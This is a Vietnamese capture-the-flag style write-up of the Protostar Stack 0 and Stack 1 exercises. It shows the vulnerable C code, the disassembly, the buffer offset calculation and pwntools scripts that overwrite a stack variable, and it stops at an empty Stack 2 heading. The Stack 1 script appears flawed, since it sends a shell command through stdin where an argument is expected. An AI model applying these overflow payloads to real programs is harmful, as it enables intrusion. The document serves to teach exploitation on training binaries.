# WriteUp
# PROTOSTAR EXPLOIT EXERCISE
## Stack 0 
Hãy cùng mở đầu với stackz3r0 nào các bạn ! Đề bài đã cung cấp cho chúng ta code C nên mọi thứ sẽ dễ hình dung hơn là mã ASM tuy nhiên chúng ta sẽ phân tích cả 2 nhé! 
Từ code C dưới đây, đề bài yêu cầu chúng ta thấy đề bài yêu cầu chúng ta thay đổi biến *modified* để in ra dòng *You changed the 'modified' variable* :
=> Nhìn từ code thì chúng ta sẽ có ý tưởng rằng nhập vào buffer bằng hàn gets và tràn sang modified.
```
/*gcc -o stack0 stackzero.c -fno-stack-protector -g -z execstack */

#include<stdlib.h>
#include<unistd.h>
#include<stdio.h>

int main(int argc, char **argv)
{
	volatile int modified;
	char buffer[64];

	modified = 0;
	gets(buffer);

	if(modified != 0 )
		printf("You changed the 'modified' variable \n");
	else
		printf("Try again?\n");
}
```
Mã ASM mà chúng ta disassemble từ gdb của file stack0 như sau : 
```
   0x0000000000400547 <+0>:	push   rbp
   0x0000000000400548 <+1>:	mov    rbp,rsp
   0x000000000040054b <+4>:	sub    rsp,0x60
   0x000000000040054f <+8>:	mov    DWORD PTR [rbp-0x54],edi
   0x0000000000400552 <+11>:	mov    QWORD PTR [rbp-0x60],rsi
   0x0000000000400556 <+15>:	mov    DWORD PTR [rbp-0x4],0x0
   0x000000000040055d <+22>:	lea    rax,[rbp-0x50]
   0x0000000000400561 <+26>:	mov    rdi,rax
   0x0000000000400564 <+29>:	mov    eax,0x0
   0x0000000000400569 <+34>:	call   0x400450 <gets@plt>
   0x000000000040056e <+39>:	mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000400571 <+42>:	test   eax,eax
   0x0000000000400573 <+44>:	je     0x400581 <main+58>
   0x0000000000400575 <+46>:	mov    edi,0x400628
   0x000000000040057a <+51>:	call   0x400430 <puts@plt>
   0x000000000040057f <+56>:	jmp    0x40058b <main+68>
   0x0000000000400581 <+58>:	mov    edi,0x40064d
   0x0000000000400586 <+63>:	call   0x400430 <puts@plt>
   0x000000000040058b <+68>:	mov    eax,0x0
   0x0000000000400590 <+73>:	leave  
   0x0000000000400591 <+74>:	ret   
```
Theo lý thuyết của buffer overflow thì chúng ta chỉ cần nhập byte vào cho tràn biến buffer và tràn sang modified là oke :< Vậy thì phải xác định được vị trí và kích thước của buffer và modified.
Dựa vào mã ASM ở trên chúng ta suy ra được :
[rbp-0x50] sẽ là địa chỉ của *buffer*
[rbp-0x4] sẽ là địa chỉ của *modified*
0x50 - 0x4 = 0x4c có nghĩa chỉ cần đè > 0x4c là có thể 

Mình dùng đoạn code sau để exploit bài này!
```
from pwn import *

BIN = "./stack0"
DEBUG = 1

gets = 0x0000000000400588
callback = 0x0000000000400575
def exploit():
  payload = b"A"*0x4c + b"B"
  # _breakpoint = """
  #     b *0x0000000000400588
  # """
  # gdb.attach(io, _breakpoint)
  io.sendline(payload)
  io.recv()
  io.interactive()


io = process(BIN)
# context.log_level='debug'
exploit()
```

```
You changed the 'modified' variable
```
## Stack 1

LevelUp++ ! 
Cùng check code C đề cung cấp cho chúng ta như sau :
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("You have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```
Chà chà , bài này về cơ chế cũng tương tự bài z3r0 thôi nhé ! Nhưng mà khác ở điểm phương thức nhập input sẽ khác và biến modified yêu cầu thành 1 giá trị xác định rõ ràng cụ thể là *modified = 0x61626364* và input sẽ nhập bằng argv[1] !
Cũng không có gì là quá khó vì chúng ta đã xác định được vị trí của 2 biến trên.
Có 1 điều cần lưu ý là đối với địa chỉ sẽ được ghi theo little edian, có nghĩa là byte nhỏ nhất sẽ nằm ở đầu tiền và byte lớn nhất lại nằm sau cùng ! Tuy nhiên chúng ta có hàm p64() từ thư viện pwntools sẽ giúp chúng ta phần đó 
p64() là vì chương trình này chúng ta complier nó ở hệ điều hành 64 bit, còn nếu 32 bit thì dùng p32().
```
from pwn import *

BIN = "./stack1"
DEBUG = 1

modified = 0x61626364
payload = b"A"*0x4c 
payload += p64(modified)


io = process(BIN)
io.sendline("./stack1 `python -c 'print(payload)'`")

io.interactive()
```
Và cứ thế chúng ta có được dòng :
```
You have correctly got the variable to the right value
```

## Stack 2



























